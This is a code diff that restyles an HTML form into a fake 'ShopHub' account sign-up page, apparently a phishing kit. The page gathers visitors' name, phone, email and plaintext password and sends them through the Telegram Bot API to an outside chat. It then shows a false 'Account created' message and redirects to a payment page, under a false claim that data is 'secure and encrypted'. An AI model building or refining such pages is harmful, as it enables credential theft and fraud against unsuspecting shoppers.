@@ -3,42 +3,968 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Page</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Create Your Account - ShopHub</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        .error { color: red; font-size: 12px; }
-        .invalid { border: 1px solid red; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            padding: 40px 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+
+        .logo-container {
+            position: relative;
+            z-index: 2;
+            margin-bottom: 20px;
+        }
+
+        .logo-placeholder {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .logo-placeholder i {
+            font-size: 32px;
+            color: white;
+        }
+
+        .logo-placeholder img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+            position: relative;
+            z-index: 2;
+        }
+
+        .form-container {
+            padding: 40px 30px;
+        }
+
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .welcome-text h2 {
+            color: #1f2937;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text p {
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: #374151;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+            font-size: 16px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9fafb;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #4f46e5;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+
+        .form-group input:focus + .input-wrapper i {
+            color: #4f46e5;
+        }
+
+        .error {
+            color: #ef4444;
+            font-size: 12px;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .error i {
+            font-size: 12px;
+        }
+
+        .invalid {
+            border-color: #ef4444 !important;
+            background: #fef2f2 !important;
+        }
+
+        .btn {
+            width: 100%;
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .footer {
+            padding: 20px 30px;
+            background: #f8fafc;
+            border-top: 1px solid #e5e7eb;
+            text-align: center;
+        }
+
+        .footer p {
+            color: #6b7280;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #4f46e5;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            color: #059669;
+            font-size: 12px;
+        }
+
+        .security-badge i {
+            font-size: 14px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e5e7eb;
+        }
+
+        .divider span {
+            padding: 0 15px;
+            color: #6b7280;
+            font-size: 13px;
+        }
+
+        .benefits {
+            background: #f0f9ff;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+        }
+
+        .benefits h3 {
+            color: #0369a1;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .benefits ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .benefits li {
+            color: #075985;
+            font-size: 13px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .benefits li i {
+            font-size: 10px;
+            color: #0ea5e9;
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container {
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .form-group {
+            animation: fadeInUp 0.6s ease-out;
+            animation-fill-mode: both;
+        }
+
+        .form-group:nth-child(1) { animation-delay: 0.1s; }
+        .form-group:nth-child(2) { animation-delay: 0.2s; }
+        .form-group:nth-child(3) { animation-delay: 0.3s; }
+        .form-group:nth-child(4) { animation-delay: 0.4s; }
+
+        /* Responsive Design for All Screen Sizes */
+        
+        /* Extra Large Screens (1400px and up) */
+        @media (min-width: 1400px) {
+            .container {
+                max-width: 500px;
+            }
+            
+            .header h1 {
+                font-size: 32px;
+            }
+            
+            .header p {
+                font-size: 18px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 28px;
+            }
+            
+            .form-group input {
+                padding: 18px 18px 18px 50px;
+                font-size: 18px;
+            }
+            
+            .btn {
+                padding: 18px;
+                font-size: 18px;
+            }
+        }
+
+        /* Large Screens (1200px to 1399px) */
+        @media (min-width: 1200px) and (max-width: 1399px) {
+            .container {
+                max-width: 480px;
+            }
+            
+            .form-container {
+                padding: 45px 35px;
+            }
+        }
+
+        /* Medium Screens (992px to 1199px) */
+        @media (min-width: 992px) and (max-width: 1199px) {
+            .container {
+                max-width: 450px;
+            }
+            
+            .header {
+                padding: 35px 25px;
+            }
+            
+            .form-container {
+                padding: 40px 30px;
+            }
+        }
+
+        /* Small Screens (768px to 991px) - Tablets */
+        @media (min-width: 768px) and (max-width: 991px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                max-width: 420px;
+                margin: 20px auto;
+            }
+            
+            .header {
+                padding: 30px 20px;
+            }
+            
+            .header h1 {
+                font-size: 26px;
+            }
+            
+            .header p {
+                font-size: 15px;
+            }
+            
+            .logo-placeholder {
+                width: 70px;
+                height: 70px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 28px;
+            }
+            
+            .form-container {
+                padding: 35px 25px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 22px;
+            }
+            
+            .benefits {
+                padding: 18px;
+            }
+            
+            .form-group {
+                margin-bottom: 22px;
+            }
+            
+            .form-group input {
+                padding: 14px 14px 14px 42px;
+                font-size: 15px;
+            }
+            
+            .input-wrapper i {
+                font-size: 15px;
+            }
+            
+            .btn {
+                padding: 15px;
+                font-size: 15px;
+            }
+        }
+
+        /* Extra Small Screens (576px to 767px) - Large Mobile */
+        @media (min-width: 576px) and (max-width: 767px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                max-width: 100%;
+                margin: 10px;
+                border-radius: 15px;
+            }
+            
+            .header {
+                padding: 25px 15px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .header p {
+                font-size: 14px;
+            }
+            
+            .logo-placeholder {
+                width: 65px;
+                height: 65px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 26px;
+            }
+            
+            .form-container {
+                padding: 30px 20px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 20px;
+            }
+            
+            .welcome-text p {
+                font-size: 13px;
+            }
+            
+            .benefits {
+                padding: 15px;
+                margin-bottom: 20px;
+            }
+            
+            .benefits h3 {
+                font-size: 13px;
+            }
+            
+            .benefits li {
+                font-size: 12px;
+            }
+            
+            .form-group {
+                margin-bottom: 20px;
+            }
+            
+            .form-group label {
+                font-size: 13px;
+            }
+            
+            .form-group input {
+                padding: 13px 13px 13px 40px;
+                font-size: 14px;
+            }
+            
+            .input-wrapper i {
+                font-size: 14px;
+                left: 13px;
+            }
+            
+            .btn {
+                padding: 14px;
+                font-size: 14px;
+            }
+            
+            .footer {
+                padding: 18px 20px;
+            }
+            
+            .footer p {
+                font-size: 12px;
+            }
+        }
+
+        /* Small Mobile Screens (480px to 575px) */
+        @media (min-width: 480px) and (max-width: 575px) {
+            body {
+                padding: 8px;
+            }
+            
+            .container {
+                margin: 8px;
+                border-radius: 12px;
+            }
+            
+            .header {
+                padding: 20px 12px;
+            }
+            
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            .header p {
+                font-size: 13px;
+            }
+            
+            .logo-placeholder {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 24px;
+            }
+            
+            .form-container {
+                padding: 25px 15px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 18px;
+            }
+            
+            .benefits {
+                padding: 12px;
+            }
+            
+            .benefits h3 {
+                font-size: 12px;
+            }
+            
+            .benefits li {
+                font-size: 11px;
+            }
+            
+            .form-group {
+                margin-bottom: 18px;
+            }
+            
+            .form-group input {
+                padding: 12px 12px 12px 38px;
+                font-size: 13px;
+            }
+            
+            .input-wrapper i {
+                font-size: 13px;
+                left: 12px;
+            }
+            
+            .btn {
+                padding: 13px;
+                font-size: 13px;
+            }
+            
+            .footer {
+                padding: 15px;
+            }
+        }
+
+        /* Extra Small Mobile Screens (320px to 479px) */
+        @media (max-width: 479px) {
+            body {
+                padding: 5px;
+                font-size: 14px;
+            }
+            
+            .container {
+                margin: 5px;
+                border-radius: 10px;
+            }
+            
+            .header {
+                padding: 18px 10px;
+            }
+            
+            .header h1 {
+                font-size: 20px;
+                margin-bottom: 5px;
+            }
+            
+            .header p {
+                font-size: 12px;
+            }
+            
+            .logo-placeholder {
+                width: 55px;
+                height: 55px;
+                margin-bottom: 10px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 22px;
+            }
+            
+            .form-container {
+                padding: 20px 12px;
+            }
+            
+            .welcome-text {
+                margin-bottom: 20px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 16px;
+                margin-bottom: 5px;
+            }
+            
+            .welcome-text p {
+                font-size: 12px;
+            }
+            
+            .benefits {
+                padding: 10px;
+                margin-bottom: 15px;
+            }
+            
+            .benefits h3 {
+                font-size: 11px;
+                margin-bottom: 8px;
+            }
+            
+            .benefits li {
+                font-size: 10px;
+                margin-bottom: 3px;
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+            
+            .form-group label {
+                font-size: 12px;
+                margin-bottom: 5px;
+            }
+            
+            .form-group input {
+                padding: 10px 10px 10px 35px;
+                font-size: 12px;
+                border-radius: 8px;
+            }
+            
+            .input-wrapper i {
+                font-size: 12px;
+                left: 10px;
+            }
+            
+            .btn {
+                padding: 12px;
+                font-size: 12px;
+                border-radius: 8px;
+            }
+            
+            .footer {
+                padding: 12px;
+            }
+            
+            .footer p {
+                font-size: 11px;
+                line-height: 1.3;
+            }
+            
+            .security-badge {
+                margin-top: 10px;
+                font-size: 10px;
+            }
+            
+            .security-badge i {
+                font-size: 11px;
+            }
+        }
+
+        /* Ultra Small Screens (below 320px) */
+        @media (max-width: 319px) {
+            body {
+                padding: 2px;
+            }
+            
+            .container {
+                margin: 2px;
+                border-radius: 8px;
+            }
+            
+            .header {
+                padding: 15px 8px;
+            }
+            
+            .header h1 {
+                font-size: 18px;
+            }
+            
+            .header p {
+                font-size: 11px;
+            }
+            
+            .logo-placeholder {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 20px;
+            }
+            
+            .form-container {
+                padding: 15px 8px;
+            }
+            
+            .welcome-text h2 {
+                font-size: 14px;
+            }
+            
+            .benefits {
+                padding: 8px;
+            }
+            
+            .form-group input {
+                padding: 8px 8px 8px 32px;
+                font-size: 11px;
+            }
+            
+            .input-wrapper i {
+                font-size: 11px;
+                left: 8px;
+            }
+            
+            .btn {
+                padding: 10px;
+                font-size: 11px;
+            }
+        }
+
+        /* Landscape Orientation for Mobile Devices */
+        @media screen and (max-width: 767px) and (orientation: landscape) {
+            body {
+                padding: 5px;
+            }
+            
+            .container {
+                margin: 5px auto;
+                max-width: 90%;
+            }
+            
+            .header {
+                padding: 15px;
+            }
+            
+            .logo-placeholder {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .logo-placeholder i {
+                font-size: 20px;
+            }
+            
+            .header h1 {
+                font-size: 18px;
+                margin-bottom: 5px;
+            }
+            
+            .header p {
+                font-size: 12px;
+            }
+            
+            .form-container {
+                padding: 20px 15px;
+            }
+            
+            .benefits {
+                padding: 10px;
+                margin-bottom: 15px;
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+            
+            .form-group input {
+                padding: 10px 10px 10px 35px;
+            }
+        }
+
+        /* High DPI Screens */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .container {
+                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+            }
+            
+            .btn {
+                box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);
+            }
+        }
+
+        /* Print Styles */
+        @media print {
+            body {
+                background: white;
+                padding: 0;
+            }
+            
+            .container {
+                box-shadow: none;
+                border: 1px solid #ccc;
+            }
+            
+            .header {
+                background: #f5f5f5 !important;
+                color: #333 !important;
+            }
+            
+            .btn {
+                background: #333 !important;
+                color: white !important;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Customer Information</h1>
-        <form id="paymentForm" method="POST">
-            <div class="form-group">
-                <label for="name">Name</label>
-                <input type="text" id="name" name="name" required autocomplete="name" placeholder="John Doe">
-                <div class="error" id="nameError"></div>
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo-placeholder">
+                    <!-- Replace the icon below with your logo image -->
+                    <i class="fas fa-shopping-cart"></i>
+                    <!-- To add your logo, replace the icon with: <img src="your-logo.png" alt="Logo"> -->
+                </div>
+                <h1>ShopHub</h1>
+                <p>Your Premium Shopping Experience</p>
             </div>
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" required autocomplete="tel" placeholder="123-456-7890">
-                <div class="error" id="phoneError"></div>
+        </div>
+
+        <div class="form-container">
+            <div class="welcome-text">
+                <h2>Create Your Account</h2>
+                <p>Join thousands of satisfied customers</p>
             </div>
-            <div class="form-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" name="email" required autocomplete="email" placeholder="example@email.com">
-                <div class="error" id="emailError"></div>
+
+            <div class="benefits">
+                <h3><i class="fas fa-gift"></i> Member Benefits</h3>
+                <ul>
+                    <li><i class="fas fa-check-circle"></i> Exclusive member discounts</li>
+                    <li><i class="fas fa-check-circle"></i> Free shipping on orders over $50</li>
+                    <li><i class="fas fa-check-circle"></i> Early access to sales</li>
+                    <li><i class="fas fa-check-circle"></i> 24/7 customer support</li>
+                </ul>
             </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required autocomplete="new-password" placeholder="********">
-                <div class="error" id="passwordError"></div>
+
+            <form id="paymentForm" method="POST">
+                <div class="form-group">
+                    <label for="name">Full Name</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="name" name="name" required autocomplete="name" placeholder="Enter your full name">
+                    </div>
+                    <div class="error" id="nameError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-phone"></i>
+                        <input type="tel" id="phone" name="phone" required autocomplete="tel" placeholder="Enter your phone number">
+                    </div>
+                    <div class="error" id="phoneError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-envelope"></i>
+                        <input type="email" id="email" name="email" required autocomplete="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="error" id="emailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" name="password" required autocomplete="new-password" placeholder="Create a secure password">
+                    </div>
+                    <div class="error" id="passwordError"></div>
+                </div>
+
+                <button type="submit" class="btn">
+                    <i class="fas fa-user-plus"></i> Create Account
+                </button>
+            </form>
+
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Your information is secure and encrypted</span>
             </div>
-            <button type="submit" class="btn">Create Account</button>
-        </form>
+        </div>
+
         <div class="footer">
-            <p>By clicking "Submit", you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+            <p>By creating an account, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+            <p style="margin-top: 10px; font-size: 12px;">Already have an account? <a href="#">Sign in here</a></p>
         </div>
     </div>
 
@@ -49,14 +975,14 @@
         $(document).ready(function() {
             $('#paymentForm').on('submit', function(e) {
                 e.preventDefault();
-
+                
                 var name = $('#name').val().trim();
                 var phone = $('#phone').val().trim();
                 var email = $('#email').val().trim();
                 var password = $('#password').val().trim();
-
+                
                 var message = `Customer Information:\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nPassword: ${password}`;
-
+                
                 // Send the data to Telegram
                 $.ajax({
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
@@ -67,11 +993,15 @@
                         parse_mode: 'Markdown'
                     },
                     success: function() {
-                        alert("Customer information sent successfully!");
+                        alert("Account created successfully! Welcome to ShopHub!");
                         $('#paymentForm')[0].reset(); // Reset the form
+                        // Redirect to payment page after successful registration
+                        setTimeout(function() {
+                            window.location.href = 'payment.html';
+                        }, 1000);
                     },
                     error: function() {
-                        alert("There was an error sending the information.");
+                        alert("There was an error creating your account. Please try again.");
                     }
                 });
             });
